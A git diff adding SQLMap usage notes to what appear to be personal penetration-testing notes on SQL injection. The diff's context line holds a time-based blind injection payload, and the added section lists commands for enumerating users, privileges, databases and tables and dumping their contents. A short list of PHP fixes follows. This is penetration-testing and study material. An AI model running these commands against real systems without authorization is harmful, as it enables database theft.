@@ -373,3 +373,109 @@ IF EXISTS (SELECT * FROM users WHERE username = 'monz') BENCHMARK(1000000, MD5(1
 SQLMap is a tool used for detecting and exploiting sql injection.
 
 > WARNING! Always test by hand first before using an automated tool because it may crash your targets system. You can correctly configure your tool if you know what your doing. Blindly running tools makes you a script kiddie not a professional.
+
+## Syntax
+
+```
+sqlmap -u <URL> -p <injection_parameters> [options]
+```
+
+## Example union based in-band SQLi GET
+
+```
+sqlmap -u 'http://target.net?id=1111' -p id --technique=U
+```
+
+## Example union based in-band SQLi POST
+
+```
+sqlmap -u <URL> --data=<POST_STRING> -p paramter [options]
+```
+
+In burp
+
+* intercept request
+* right click on it and click `copy to file`
+
+```
+sqlmap -r <request_file> -p parameter [options]
+```
+
+## More examples
+
+```
+# Example extract database banner
+sqlmap -u <TARGET> --banner <other options>
+
+# Example list users
+sqlmap -u <TARGET> --users <other options>
+
+# Example is dba?
+sqlmap -u <TARGET> --is-dba <other options>
+
+# Example available dbs
+sqlmap -u <TARGET> --dbs <other options>
+
+# Choose a database
+sqlmap -u <TARGET> -D <database> --tables <other options>
+
+# list columns
+sqlmap -u <TARGET> -D <database> -T <tables, comma seperated> --columns <other options>
+
+# dump output
+sqlmap -u <TARGET> -D <database> -T <table> -C <columns list> --dump <other options>
+
+```
+
+## Forcing the DBMS
+
+```
+sqlmap --dbms=<DBMS>
+```
+
+A list of DBMS...
+
+* MySQL
+* Oracle
+* postgreSQL
+* Microsoft SQL Server
+* Microsoft Access
+* SQLite
+* Firebird
+* Sybase
+* SAP MaxDB
+* DB2
+
+## --string & --not-string
+
+Web applications sometimes change their output in a way theat SQLMap cannot understand making blind exploitation impossible. In this scenario...
+
+* append --string a string which is always present in true output pages
+* append --not-string a string which is always present in false output pages
+
+```
+sqlmap -u <TARGET> --string "apache"
+sqlmap -u <TARGET> --suffix "'));'
+```
+
+## more flags
+```
+--risk
+--level
+--keep-alive
+--threads
+--technique
+```
+
+=====================================================
+
+# Mitigation strategies
+
+SQLi vulnerabilities are input validation vulnerabilities and can be prevented by enforcing input validation on any user-controlled paramter.
+
+## PHP remediations
+
+* use bind variables
+* use prepared statement
+* perform type casting
+* white-list based validation
